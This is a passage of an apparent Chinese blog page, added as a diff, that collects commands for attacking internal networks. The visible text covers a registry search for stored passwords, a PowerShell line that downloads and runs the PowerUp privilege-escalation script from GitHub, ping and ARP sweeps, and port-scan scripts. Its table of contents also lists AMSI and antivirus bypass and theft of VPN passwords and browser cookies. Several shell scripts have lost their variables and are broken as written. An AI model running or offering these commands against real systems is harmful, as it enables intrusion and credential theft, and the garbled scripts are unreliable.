@@ -1,0 +1,1310 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>内网漫游系列之内网渗透常用命令 | 码中春秋&#39;s Blog</title>
+    <meta property="og:title" content="内网漫游系列之内网渗透常用命令 - 码中春秋&#39;s Blog">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2018-10-19T12:41:27&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2018-10-19T12:41:27&#43;08:00'>
+        
+    <meta name="Keywords" content="码中春秋,博客,,taielab,java,python,项目管理,软件架构,网络安全,数字安全,隐私保护,反侦查,反技侦,匿名方案,open,freedom,democracy,decentralization">
+    <meta name="description" content="内网漫游系列之内网渗透常用命令">
+        
+    <meta name="author" content="码中春秋">
+    <meta property="og:url" content="https://blog.taielab.com/2018-10-19/network-infiltration-command.html">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+
+
+    
+    
+        <link rel="stylesheet" href='/css/douban.css'>
+    
+        <link rel="stylesheet" href='/css/other.css'>
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://blog.taielab.com">
+                        码中春秋&#39;s Blog
+                    </a>
+                
+                <p class="description">专注于Java企业级开发、数字安全、信息安全、安全运维</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://blog.taielab.com">首页</a>
+                    
+                    <a  href="https://blog.taielab.com/archives/" title="存档">存档</a>
+                    
+                    <a  href="https://blog.taielab.com/about/" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    <style type="text/css">
+    .post-toc {
+        position: fixed;
+        width: 200px;
+        margin-left: -210px;
+        padding: 5px 10px;
+        font-family: Athelas, STHeiti, Microsoft Yahei, serif;
+        font-size: 12px;
+        border: 1px solid rgba(0, 0, 0, .07);
+        border-radius: 5px;
+        background-color: rgba(255, 255, 255, 0.98);
+        background-clip: padding-box;
+        -webkit-box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        word-wrap: break-word;
+        white-space: nowrap;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        z-index: 999;
+        cursor: pointer;
+        max-height: 70%;
+        overflow-y: auto;
+        overflow-x: hidden;
+    }
+
+    .post-toc .post-toc-title {
+        width: 100%;
+        margin: 0 auto;
+        font-size: 20px;
+        font-weight: 400;
+        text-transform: uppercase;
+        text-align: center;
+    }
+
+    .post-toc .post-toc-content {
+        font-size: 15px;
+    }
+
+    .post-toc .post-toc-content>nav>ul {
+        margin: 10px 0;
+    }
+
+    .post-toc .post-toc-content ul {
+        padding-left: 20px;
+        list-style: square;
+        margin: 0.5em;
+        line-height: 1.8em;
+    }
+
+    .post-toc .post-toc-content ul ul {
+        padding-left: 15px;
+        display: none;
+    }
+
+    @media print,
+    screen and (max-width:1057px) {
+        .post-toc {
+            display: none;
+        }
+    }
+</style>
+<div class="post-toc" style="position: absolute; top: 188px;">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#一条命令揪出ssh登录者物理地址">一条命令揪出ssh登录者物理地址</a></li>
+    <li><a href="#此条命令可获取所有存储在注册表中包含密码的键值">此条命令可获取所有存储在注册表中包含密码的键值</a></li>
+    <li><a href="#扫描存活主机脚本">扫描存活主机脚本</a>
+      <ul>
+        <li><a href="#内网c段存活主机查找">内网C段存活主机查找</a></li>
+        <li><a href="#找主机名">找主机名</a></li>
+        <li><a href="#b段查找因为在一个内网里面有时候不一定只有一个域而当两个域没有信任时可以用这条扫出来">B段查找，因为在一个内网里面有时候不一定只有一个域，而当两个域没有信任时，可以用这条扫出来</a></li>
+        <li><a href="#找域机器对应ip">找域机器对应IP</a></li>
+      </ul>
+    </li>
+    <li><a href="#端口扫描脚本">端口扫描脚本</a></li>
+    <li><a href="#icmp扫描">icmp扫描</a>
+      <ul>
+        <li><a href="#在win下使用icmp扫描">在win下使用icmp扫描</a></li>
+        <li><a href="#在linux下使用各类icmp扫描">在linux下使用各类icmp扫描</a></li>
+      </ul>
+    </li>
+    <li><a href="#arp扫描">arp扫描</a>
+      <ul>
+        <li><a href="#在win下使用各种arp扫描">在win下使用各种arp扫描</a></li>
+        <li><a href="#在-linux-下使用-arp-扫描">在 linux 下使用 arp 扫描</a></li>
+      </ul>
+    </li>
+    <li><a href="#基于smb和netbios的内网主机发现方式">基于smb和netbios的内网主机发现方式</a></li>
+    <li><a href="#域内扫描">域内扫描</a></li>
+    <li><a href="#各种脚本语言不同版本一句话开启-http-服务器的总结">各种脚本语言不同版本一句话开启 HTTP 服务器的总结</a>
+      <ul>
+        <li><a href="#python-2x"><strong>Python 2.x</strong></a></li>
+        <li><a href="#python-3x"><strong>Python 3.x</strong></a></li>
+        <li><a href="#twisted-python"><strong>Twisted (Python)</strong></a></li>
+        <li><a href="#ruby"><strong>Ruby</strong></a></li>
+        <li><a href="#perl"><strong>Perl</strong></a></li>
+        <li><a href="#http-server-nodejs">http-server (Node.js)</a></li>
+        <li><a href="#node-static-nodejs">node-static (Node.js)</a></li>
+        <li><a href="#php--54">PHP (&gt;= 5.4)</a></li>
+        <li><a href="#erlang">Erlang</a></li>
+        <li><a href="#busybox-httpd">busybox httpd</a></li>
+        <li><a href="#webfs">webfs</a></li>
+        <li><a href="#iis-express">IIS Express</a></li>
+        <li><a href="#whois">Whois</a></li>
+        <li><a href="#nc">NC</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#bash">Bash</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux">Linux</a>
+      <ul>
+        <li><a href="#利用bash提权">利用BASH提权</a></li>
+        <li><a href="#lsof-命令"><strong>lsof 命令</strong></a></li>
+        <li><a href="#ssh端口转发">SSH端口转发</a></li>
+        <li><a href="#图片马"><strong>图片马</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#windows">Windows</a>
+      <ul>
+        <li><a href="#powershell"><strong>Powershell</strong></a></li>
+        <li><a href="#mshta"><strong>MSHTA</strong></a></li>
+        <li><a href="#bypass-amsi"><strong>Bypass AMSI</strong></a></li>
+        <li><a href="#bypass-av">Bypass AV</a></li>
+        <li><a href="#获取vpn密码">获取vpn密码</a></li>
+        <li><a href="#读取chrome-cookies">读取chrome cookies</a></li>
+      </ul>
+    </li>
+    <li><a href="#命令行下载">命令行下载</a>
+      <ul>
+        <li><a href="#certutil">certutil</a></li>
+        <li><a href="#powshell">powshell</a></li>
+        <li><a href="#bitsadmin">bitsadmin</a></li>
+        <li><a href="#regsvr32">regsvr32</a></li>
+        <li><a href="#curl">curl</a></li>
+        <li><a href="#wget">wget</a></li>
+        <li><a href="#awk">awk</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function () {
+        var postToc = $(".post-toc");
+        if (postToc.length) {
+            var leftPos = $("#main").offset().left;
+            if(leftPos<220){
+                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            }
+
+            var t = postToc.offset().top - 20,
+                a = {
+                    start: {
+                        position: "absolute",
+                        top: t
+                    },
+                    process: {
+                        position: "fixed",
+                        top: 20
+                    },
+                };
+            $(window).scroll(function () {
+                var e = $(window).scrollTop();
+                e < t ? postToc.css(a.start) : postToc.css(a.process)
+            })
+        }
+    })
+</script>
+    <article class="post">
+        <header>
+            <h1 class="post-title">内网漫游系列之内网渗透常用命令</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2018年10月19日
+        </date>
+        
+        <div class="post-meta">
+            <span>|</span>
+            
+            <span class="meta-category"><a href='https://blog.taielab.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F'>内网渗透</a></span>
+            
+        </div>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="clear" style="display: none">
+            <div class="toc-article">
+                <div class="toc-title">文章目录</div>
+            </div>
+        </div>
+        
+        <div class="post-content">
+            <blockquote>
+<p>整合了一些常用的用于内网渗透的时候使用的一些命令，用于备忘和查找。</p>
+</blockquote>
+<h2 id="一条命令揪出ssh登录者物理地址">一条命令揪出ssh登录者物理地址</h2>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#000;font-weight:bold">for</span> i in grep <span style="color:#d14">&#39;sshd&#39;</span> /var/log/auth.log* |grep <span style="color:#d14">&#39;Accepted&#39;</span> |grep ftp| grep -oE  <span style="color:#d14">&#39;\&lt;([1-9]|[1-9][0-9]|1[0-9]{2}|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\&gt;){2}\.\&lt;([1-9]|[0-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-4])\&gt;&#39;</span> | sort  | uniq; <span style="color:#000;font-weight:bold">do</span> curl  -s --header <span style="color:#d14">&#34;X-Forwarded-For: i&#34;</span> http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P <span style="color:#d14">&#39;(?&lt;=&lt;center&gt;您的IP是：).*(?=&lt;\/center)&#39;</span> ; <span style="color:#000;font-weight:bold">done</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="此条命令可获取所有存储在注册表中包含密码的键值">此条命令可获取所有存储在注册表中包含密码的键值</h2>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">REG query HKCU  /v <span style="color:#d14">&#34;pwd&#34;</span> /s  <span style="color:#998;font-style:italic">#pwd可替换为password \ HKCU 可替换为HKCR</span>
+
+powerup.ps1用于进行提权检测，这个脚本会查找 所在服务器的 服务 ，dll ,第三方等 可提权的漏洞信息
+
+powershell  IEX <span style="color:#000;font-weight:bold">(</span>New-Object Net.WebClient<span style="color:#000;font-weight:bold">)</span>.DownloadString<span style="color:#000;font-weight:bold">(</span><span style="color:#d14">&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;</span><span style="color:#000;font-weight:bold">)</span>;Invoke-AllChecks
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="扫描存活主机脚本">扫描存活主机脚本</h2>
+<p>使用方法 <code>./xxx.sh 192.168.10 &gt; IP</code></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-weight:bold;font-style:italic">#!/bin/bash
+</span><span style="color:#999;font-weight:bold;font-style:italic"></span>is_alive_ping<span style="color:#000;font-weight:bold">()</span>
+<span style="color:#000;font-weight:bold">{</span>
+  ping -c <span style="color:#099">1</span> <span style="color:#099">1</span> &gt; /dev/null
+  <span style="color:#000;font-weight:bold">[</span> ? -eq <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">]</span> <span style="color:#000;font-weight:bold">&amp;&amp;</span> <span style="color:#0086b3">echo</span> i
+<span style="color:#000;font-weight:bold">}</span>
+<span style="color:#0086b3">read</span> -p <span style="color:#d14">&#34;IP[1.2.3]&#34;</span> IP
+<span style="color:#000;font-weight:bold">for</span> i in IP.<span style="color:#000;font-weight:bold">{</span>1..254<span style="color:#000;font-weight:bold">}</span> 
+<span style="color:#000;font-weight:bold">do</span>
+is_alive_ping i &amp; <span style="color:#0086b3">disown</span>
+<span style="color:#000;font-weight:bold">done</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="内网c段存活主机查找">内网C段存活主机查找</h3>
+<p><code>for /l %i in (1,1,255) do @ping 10.0.1.%i -w 1 -n 1 | find /i &quot;ttl&quot;</code></p>
+<h3 id="找主机名">找主机名</h3>
+<p><code>for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i &quot;Pinging&quot;</code></p>
+<h3 id="b段查找因为在一个内网里面有时候不一定只有一个域而当两个域没有信任时可以用这条扫出来">B段查找，因为在一个内网里面有时候不一定只有一个域，而当两个域没有信任时，可以用这条扫出来</h3>
+<p><code>for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i &quot;Pinging&quot;</code></p>
+<h3 id="找域机器对应ip">找域机器对应IP</h3>
+<p><code>FOR /F &quot;eol=- tokens=1 delims=\ &quot; %a IN ('net view') DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 | find /i &quot;ttl&quot; &amp; echo.)</code></p>
+<h2 id="端口扫描脚本">端口扫描脚本</h2>
+<p>使用方法是直接运行该python程序， 比如保存为test.py ，直接运行 python test.py ，不过前提是你需要有IP文件，即就是第一步中你用shell脚本生成的IP列表</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#000;font-weight:bold">import</span> <span style="color:#555">threading</span><span style="color:#000;font-weight:bold">,</span><span style="color:#555">os</span><span style="color:#000;font-weight:bold">,</span><span style="color:#555">time</span>
+<span style="color:#000;font-weight:bold">def</span> <span style="color:#900;font-weight:bold">ncDetect</span>(IP):
+    command <span style="color:#000;font-weight:bold">=</span> <span style="color:#d14">&#34;nc -v -z &#34;</span> <span style="color:#000;font-weight:bold">+</span> IP <span style="color:#000;font-weight:bold">+</span><span style="color:#d14">&#34; 21-9000 2&gt;&amp;1| grep succeed&#34;</span>
+    f <span style="color:#000;font-weight:bold">=</span> os<span style="color:#000;font-weight:bold">.</span>system(command)
+    
+
+IPHandle <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">open</span>(<span style="color:#d14">&#34;IP&#34;</span>,<span style="color:#d14">&#34;r&#34;</span>)
+test <span style="color:#000;font-weight:bold">=</span> IPHandle<span style="color:#000;font-weight:bold">.</span>readline()
+test <span style="color:#000;font-weight:bold">=</span> test<span style="color:#000;font-weight:bold">.</span>strip(<span style="color:#d14">&#39;</span><span style="color:#d14">\n</span><span style="color:#d14">&#39;</span>)
+<span style="color:#000;font-weight:bold">while</span> test:
+    <span style="color:#000;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#0086b3">range</span>(<span style="color:#099">5</span>):
+        t <span style="color:#000;font-weight:bold">=</span> threading<span style="color:#000;font-weight:bold">.</span>Thread(target<span style="color:#000;font-weight:bold">=</span>ncDetect,args<span style="color:#000;font-weight:bold">=</span>(test,))
+        t<span style="color:#000;font-weight:bold">.</span>start()
+        test <span style="color:#000;font-weight:bold">=</span> IPHandle<span style="color:#000;font-weight:bold">.</span>readline()
+        test <span style="color:#000;font-weight:bold">=</span> test<span style="color:#000;font-weight:bold">.</span>strip(<span style="color:#d14">&#39;</span><span style="color:#d14">\n</span><span style="color:#d14">&#39;</span>)
+    time<span style="color:#000;font-weight:bold">.</span>sleep(<span style="color:#099">5</span>)
+    test <span style="color:#000;font-weight:bold">=</span> IPHandle<span style="color:#000;font-weight:bold">.</span>readline()
+    test <span style="color:#000;font-weight:bold">=</span> test<span style="color:#000;font-weight:bold">.</span>strip(<span style="color:#d14">&#39;</span><span style="color:#d14">\n</span><span style="color:#d14">&#39;</span>)
+<span style="color:#0086b3">exit</span>(<span style="color:#099">0</span>)
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="icmp扫描">icmp扫描</h2>
+<p>基于icmp的各种内网主机发现方式，如果防火墙过滤的icmp请求，这种方式基本就废了，但是基本上都不会过滤icmp协议的请求。除了本身自带的命令，也可以考虑使用第三方程序，比如<code>cping</code>。</p>
+<h3 id="在win下使用icmp扫描">在win下使用icmp扫描</h3>
+<ul>
+<li>
+<p>cmd中执行如下命令，对整个C段进行ping扫描</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#000;font-weight:bold">for</span> /l %i in <span style="color:#000;font-weight:bold">(</span>1,1,255<span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">do</span> @ping 192.168.1.%i -w <span style="color:#099">1</span> -n <span style="color:#099">1</span> | find /i <span style="color:#d14">&#34;ttl&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>B 段查找</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#000;font-weight:bold">for</span> /l %i in <span style="color:#000;font-weight:bold">(</span>1,1,255<span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">do</span> @ping -a 10.0.%i.1 -w <span style="color:#099">1</span> -n <span style="color:#099">1</span> | find /i <span style="color:#d14">&#34;Pinging&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<p>另外<code>findstr /i “pinging”</code>或<code>findstr /i “ping”</code> 可以换成<code>findstr “[”</code> 的 可以适合多语言环境</p>
+<ul>
+<li>
+<p>利用powershell对目标内网进行icmp扫描</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">powershell.exe -exec bypass -Command <span style="color:#d14">&#34;Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&#34;</span>  
+  
+目标网段，并非仅限C段，比如你也可以写成这种方式<span style="color:#d14">`</span>192.168.3.1 - 192.168.31.254<span style="color:#d14">`</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h3 id="在linux下使用各类icmp扫描">在linux下使用各类icmp扫描</h3>
+<ul>
+<li>
+<p>最简单的方式,将下面的代码保存至shell中,赋予其执行权限,执行该脚本即可</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-weight:bold;font-style:italic">#!/bin/bash
+</span><span style="color:#999;font-weight:bold;font-style:italic"></span><span style="color:#000;font-weight:bold">for</span> ip in 192.168.1.<span style="color:#000;font-weight:bold">{</span>1..254<span style="color:#000;font-weight:bold">}</span> 
+<span style="color:#000;font-weight:bold">do</span> 
+  ping ip -c <span style="color:#099">1</span> &amp;&gt; /dev/null 
+      <span style="color:#000;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">[</span> ? -eq <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">]</span>;<span style="color:#000;font-weight:bold">then</span> 
+          <span style="color:#0086b3">echo</span> ip is alive .... 
+      <span style="color:#000;font-weight:bold">fi</span> 
+<span style="color:#000;font-weight:bold">done</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>nmap的icmp扫描</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sn -PE 192.168.1.0/24
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h2 id="arp扫描">arp扫描</h2>
+<h3 id="在win下使用各种arp扫描">在win下使用各种arp扫描</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">start /b arpscan.exe -t 192.168.1.0/24 &gt;&gt; result.txt
+
+powershell.exe -exec bypass -Command <span style="color:#d14">&#34;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&#34;</span>  &gt;&gt; result.txt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="在-linux-下使用-arp-扫描">在 linux 下使用 arp 扫描</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
